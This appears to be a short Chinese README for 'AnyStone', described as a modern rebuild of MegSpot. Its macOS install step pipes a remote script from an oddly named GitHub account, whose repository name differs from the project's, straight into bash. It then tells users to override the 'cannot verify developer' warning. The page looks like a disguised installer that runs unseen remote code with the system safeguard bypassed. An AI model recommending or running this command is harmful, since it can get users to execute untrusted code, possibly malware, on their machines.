# AnyStone

本项目基于 [MegSpot](https://github.com/MegEngine/MegSpot) 进行现代化重构。

功能与使用方式请参考 MegSpot 官方文档。

## 安装 (macOS)

```bash
curl -fsSL https://raw.githubusercontent.com/sumching51us-gif/macstone/main/scripts/install.sh | bash
```

安装后可在 Launchpad 或 Spotlight (Cmd+Space) 中打开应用。

首次启动若提示"无法验证开发者"，请到**系统设置 → 隐私与安全性 → 仍要打开**。
